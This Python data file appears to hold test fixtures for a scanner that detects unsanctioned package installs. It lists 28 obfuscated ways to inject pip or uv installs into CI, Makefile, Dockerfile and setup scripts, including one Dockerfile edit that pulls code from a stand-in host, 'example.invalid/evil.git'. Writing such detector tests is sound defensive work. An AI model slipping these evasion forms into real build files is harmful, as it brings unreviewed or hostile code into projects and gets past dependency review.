"""The 28 real-file install forms from reviews r1-r3 (E1-E5, M4a-i, R1-R14), as data.

Each is an in-memory edit of a real tracked file: ('append', path, text) or
('replace', path, old, new). Frozen from the review harnesses (r1 neuters, r2 M4, r3 R);
they are inputs to the G4-CP scanner, never executed.
"""

from __future__ import annotations

FORMS: dict[str, tuple[str, ...]] = {
    "M4a-ci.yml-pip-global-opt": (
        "append",
        ".github/workflows/ci.yml",
        "          pip --no-cache-dir install fastapi",
    ),
    "M4b-Makefile-paren-PIP": ("append", "Makefile", "\t$(PIP) install fastapi"),
    "M4c-Dockerfile-exec-form": (
        "append",
        "Dockerfile",
        'RUN ["pip", "install", "fastapi"]',
    ),
    "M4d-setup.sh-pip3.12": ("append", "scripts/setup.sh", "pip3.12 install fastapi"),
    "M4e-setup.sh-VENV-bin-pip": (
        "append",
        "scripts/setup.sh",
        "$VENV/bin/pip install fastapi",
    ),
    "M4f-Makefile-python-m-pip-q": (
        "append",
        "Makefile",
        "\t$(PYTHON) -m pip -q install fastapi",
    ),
    "M4g-setup.sh-clustered-qr": (
        "append",
        "scripts/setup.sh",
        ".venv/bin/pip install --no-deps --no-build-isolation "
        "-qrrequirements-extra.txt .",
    ),
    "M4h-setup.sh-PIP_REQUIREMENT": (
        "append",
        "scripts/setup.sh",
        "PIP_REQUIREMENT=requirements-extra.txt .venv/bin/pip install "
        "--no-deps --no-build-isolation .",
    ),
    "M4i-ci.yml-python-mpip": (
        "append",
        ".github/workflows/ci.yml",
        "          python -mpip install fastapi",
    ),
    "E1": (
        "append",
        ".github/workflows/ci.yml",
        "          pip install --no-deps --no-build-isolation "
        "--requirement=requirements-unpinned.txt .",
    ),
    "E2": (
        "append",
        "scripts/setup.sh",
        ".venv/bin/pip install --no-deps --no-build-isolation -rrequirements-extra.txt .",
    ),
    "E3": (
        "replace",
        "Dockerfile",
        "--no-deps --no-build-isolation .",
        "--no-deps --no-build-isolation --editable=git+https://example.invalid/evil.git .",
    ),
    "E4": ("append", "scripts/setup.sh", '"${PIP_BIN}" install fastapi'),
    "E5": ("append", "scripts/setup.sh", "uv run --with fastapi python -c 1"),
    "R1-py-list-sanctioned-plus-name": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'subprocess.run([sys.executable, "-m", "pip", "install", '
        '"--no-deps", "--no-build-isolation", ".", extra])',
    ),
    "R2-py-list-PIP-name": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'subprocess.run([PIP, "install", "fastapi"])',
    ),
    "R3-py-backtick-shell-string": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'subprocess.run("echo `pip install fastapi`", shell=True)',
    ),
    "R4-py-concat": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'os.system("pip " + "install fastapi")',
    ),
    "R5-py-pip-internal-main": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'from pip._internal.cli.main import main as _m; _m(["install", "fastapi"])',
    ),
    "R6-py-list-plus-name": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'subprocess.run(["pip", "install", "--no-deps", "--no-build-isolation", '
        '"."] + EXTRA)',
    ),
    "R7-Makefile-var-sanctioned-prefix": (
        "append",
        "Makefile",
        "R3INSTALL = pip install --no-deps --no-build-isolation .\n"
        "r3x:\n"
        "\t$(R3INSTALL) fastapi",
    ),
    "R8-setup.sh-xargs": (
        "append",
        "scripts/setup.sh",
        "xargs -a extra.txt pip install --no-deps --no-build-isolation .",
    ),
    "R9-setup.sh-python-Impip": (
        "append",
        "scripts/setup.sh",
        "python3 -Impip install fastapi",
    ),
    "R10-setup.sh-m-pip.__main__": (
        "append",
        "scripts/setup.sh",
        "python3 -m pip.__main__ install fastapi",
    ),
    "R11-Dockerfile-pip.conf-requirement": (
        "append",
        "Dockerfile",
        "RUN printf '[install]\\nrequirement = /extra.txt\\n' > /etc/pip.conf",
    ),
    "R12-setup.sh-pip-config-set": (
        "append",
        "scripts/setup.sh",
        "pip config --site set install.requirement extra.txt",
    ),
    "R13-ci.yml-uv-run": (
        "append",
        ".github/workflows/ci.yml",
        "          uv run pytest",
    ),
    "R14-setup.sh-brace-default": (
        "append",
        "scripts/setup.sh",
        "${PIPX:-pip} install fastapi",
    ),
}
